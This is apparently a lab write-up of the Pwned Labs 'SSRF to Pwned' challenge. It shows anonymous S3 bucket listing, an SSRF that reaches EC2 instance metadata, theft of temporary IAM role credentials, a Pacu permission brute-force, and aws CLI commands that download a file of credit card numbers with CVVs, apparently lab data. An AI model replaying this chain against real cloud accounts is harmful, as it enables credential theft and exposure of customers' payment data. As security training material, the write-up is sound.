# Challenge Lab Name: `SSRF to Pwned`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://pwnedlabs.io" target="_blank" title="Open Pwned Labs Platform"><img src="https://img.shields.io/badge/Pwned_Labs_↗-181717?style=flat&logo=pwnedlabs&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Pwned Labs Platform Link"></a> &nbsp;
>
>Rumors are swirling on hacker forums about a potential breach at Huge Logistics. Your team has been monitoring these conversations closely, and Huge Logistics has asked you to assess the security of their website. Beyond the surface-level assessment, you're also to investigate links to their cloud infrastructure, mapping out any potential risk exposure. The question isn't just if they've been compromised, but how deep the rabbit hole goes.

</details>

## Detailed Methodology

<details open>
<summary><b>Initial Access</b></summary>

The initial access given for this engagement was a public website.

```
http://app.huge-logistics.com
```

After connecting to Pwned Labs' VPN I was able to access the website, which is shown below. 
<div align="center">
  <img src="../images/SSRF-to-Pwned/Pasted image 20261026082324.png" alt="Website's main page." width="500" />
  <p><em>Website's main page.</em></p>
</div>

From the website's main page I didn't notice anything interesting so I went ahead and checked the source code of the website. Viewing the source code can usually be done by right-clicking on the page and selecting **View page source**. 

<div align="center">
  <img src="../images/SSRF-to-Pwned/Pasted image 20261026170310.png" alt="Website's main page source code." width="500" />
  <p><em>Website's main page source code.</em></p>
</div>

When I viewed the website's source code I could see that some of the images on the website were being hosted from an AWS S3 bucket. 

```
https://huge-logistics-storage.s3.amazonaws.com/
```

### S3 Enumeration

Now that I had an S3 bucket name I went ahead and checked to see if I could view more objects in the bucket. When I did view the `huge-logistics-storage` S3 bucket I saw that there were two folders, `backup/` and `web/`. 

 
Viewing the S3 bucket via the AWS CLI:
```bash
└─$ aws s3 ls s3://huge-logistics-storage --no-sign-request                
                           PRE backup/
                           PRE web/
```

I first viewed the `backup/` folder and noted a few text files which I tried downloading. 

```bash
└─$ aws s3 ls s3://huge-logistics-storage/backup/ --no-sign-request
2023-05-31 15:14:05          0 
2023-05-31 15:14:47       3717 cc-export2.txt
2023-06-01 07:38:27         32 flag.txt
```

Shown from the command output below, I did not have permission to download the files from the `backup/` folder. 

```bash
└─$ aws s3 cp s3://huge-logistics-storage/backup/cc-export2.txt . --no-sign-request
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
...
└─$ aws s3 cp s3://huge-logistics-storage/backup/flag.txt . --no-sign-request
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

I then tried viewing the `web/` folder and saw that there was another folder, `images/`, which contained multiple JPEG files. When I tried downloading one of the files from the `images/` I was able to do so but since there wasn't anything sensitive I moved on to exploring more of the website. 

```bash
└─$ aws s3 ls s3://huge-logistics-storage/web/ --no-sign-request       
                           PRE images/
2023-05-31 13:40:47  
...
└─$ aws s3 ls s3://huge-logistics-storage/web/images/ --no-sign-request
2023-05-31 13:42:33     114886 about.jpg
2023-05-31 13:42:34     271657 banner.jpg
2023-05-31 13:42:35      48441 blog1.jpg
2023-05-31 13:42:36      32805 blog2.jpg
2023-05-31 13:42:36      44570 blog3.jpg
2023-05-31 13:42:37      20032 executive.jpg
2023-05-31 13:42:37      13368 manager.jpg
2023-05-31 13:42:38      18260 manager1.jpg
2023-05-31 13:42:38      42216 signature.jpg
```

</details>


<details open>
<summary><b>SSRF Exploitation & Privilege Escalation</b></summary>

When viewing the website again I clicked on the **Status** button on the navigation bar, which led me to the Huge Logistics Service Status page. This page had the URL `http://app.huge-logistics.com/status/status.php`. 

<div align="center">
  <img src="../images/SSRF-to-Pwned/Pasted image 20261027083134.png" alt="Viewing the 'Huge Logistics Service Status' page." width="500" />
  <p><em>Viewing the 'Huge Logistics Service Status' page.</em></p>
</div>

Clicking the **Check** button I saw the URL change to `http://app.huge-logistics.com/status/status.php?name=hugelogisticsstatus.com`. From the URL change I could see that the server was requesting for a web resource. From here I went ahead and captured the HTTP Request from Burp Suite so I could try and exploit any SSRF vulnerabilities. I did this by right-clicking the request and sending it to **Repeater**. 

<div align="center">
  <img src="../images/SSRF-to-Pwned/Pasted image 20261026082550.png" alt="Viewing the status on the 'Huge Logistics Service Status' page." width="500" />
  <p><em>Viewing the status on the 'Huge Logistics Service Status' page.</em></p>
</div>



<div align="center">
  <img src="../images/SSRF-to-Pwned/Pasted image 20261026162715.png" alt="Retrieving the GET Request from Burp Suite CE." width="500" />
  <p><em>Retrieving the GET Request from Burp Suite CE.</em></p>
</div>

Checking the AWS documentation for viewing EC2 instance metadata [here](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) it could be possible that this website was running on an EC2 instance with its images hosted on a S3 bucket. Originally when I tried exploiting this SSRF vulnerability I tried using the full URL to retrieve the EC2 Instance Metadata but recieved the same HTTP response as the original check button provided. When I removed the `https://` part from the HTTP Request header the items from the Instance Metadata was displayed in the HTTP response, which is shown below. 

<div align="center">
  <img src="../images/SSRF-to-Pwned/Pasted image 20261026165046.png" alt="Viewing the EC2 instance metadata from a SSRF vulnerability." width="500" />
  <p><em>Viewing the EC2 instance metadata from a SSRF vulnerability.</em></p>
</div>

From here I checked to see if there were any IAM roles attached to the EC2 instance by using the path shown on this AWS documentation [page](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories). When inputting the URL path and sending the request I found an IAM role attached to the EC2 isntance, `MetapwnedS3Access`, which is shown below. 

<div align="center">
  <img src="../images/SSRF-to-Pwned/Pasted image 20261026165309.png" alt="Viewing an IAM role attached to the EC2 instance." width="500" />
  <p><em>Viewing an IAM role attached to the EC2 instance.</em></p>
</div>

Since there was an IAM role attached I went ahead and changed the URL in the HTTP request header to get temporary credentials for the IAM role `MetapwnedS3Access`, shown below. 

<div align="center">
  <img src="../images/SSRF-to-Pwned/Pasted image 20261026165427.png" alt="Viewing temporary credentials for the IAM role found in the EC2 instance metadata." width="500" />
  <p><em>Viewing temporary credentials for the IAM role found in the EC2 instance metadata.</em></p>
</div>


</details>

<details open>
<summary><b>Data Exfiltration</b></summary>

Once I got the temporary credentials for the IAM role found earlier I went ahead and configured a profile with the credentials shown in the HTTP response. I did this by running `aws configure --profile MetapwnedS3Access` then copying and pasting the access key, secret access key, and the session token. I also used the default region of **us-east-1** and the default output of **json**. Once the profile was configured I went ahead and ran the command below to view more details about the IAM role, which is shown in the command output below. 

```bash
└─$ aws sts get-caller-identity --profile MetapwnedS3Access
{
    "UserId": "AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1"
}
```

#### Assumed IAM Role Enumeration

Initially I went ahead and ran IAM commands to try and view any policies attached to the IAM role but got an **AccessDenied** error. To automate finding what permissions this IAM role had I went ahead and ran Pacu's **iam__bruteforce_permissions** module, which showed that the IAM role did not have any particular permissions I could exploit. 

```bash
Pacu (ssrf:imported-MetapwnedS3Access) > run iam__bruteforce_permissions
  Running module iam__bruteforce_permissions...
...
Pacu (ssrf:imported-MetapwnedS3Access) > data iam
{
  "permissions": {
    "allow": [
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints",
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity",
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints"
    ],
    "deny": []
  }
}
```

#### S3 Bucket Objects Downloaded 

Since I now had access to an IAM role but no permissions to enumerate and gather information on more AWS resources I went ahead and checked to see if this IAM role had permission to download the S3 bucket objects found earlier. Shown in the command output below, using the assumed IAM role credentials I was able to download the `cc-export2.txt` file. 

```bash
└─$ aws s3 cp s3://huge-logistics-storage/backup/cc-export2.txt . --profile MetapwnedS3Access
download: s3://huge-logistics-storage/backup/cc-export2.txt to ./cc-export2.txt
```

When viewing this file I found that it contained credit card information: the credit card number, the expiry date, and the security code! I was also able to download the `flag.txt` file which contained the challenge flag for the lab. 

```bash
└─$ cat cc-export2.txt        
VISA, 4929854977595222, 5/2028, 733
VISA, 4532044427558124, 7/2024, 111
VISA, 4539773096403690, 12/2028, 429
VISA, 4485480371143975, 4/2027, 744
VISA, 4556373594815152, 5/2024, 188
VISA, 4532459642763863, 10/2023, 808
VISA, 4838078625735408, 3/2024, 586
VISA, 4485222344412917, 3/2024, 399
...
```

</details>

<details open>
<summary><b>Impact & Post-Exploitation Potential</b></summary>

This lab clearly demonstrated the impact of not using IMDSv2 for the EC2 instance metadata and not disabling public access to the S3 bucket found earlier in the website's source code. Together these AWS misconfigurations and bad security practices (e.g. unencryted credit card information) led to accessing  customer credit card information. Not only does this make customers the victims of financial ruin, but it even impacts the company's reputation and therefore ruining them financially as well. 

</details>
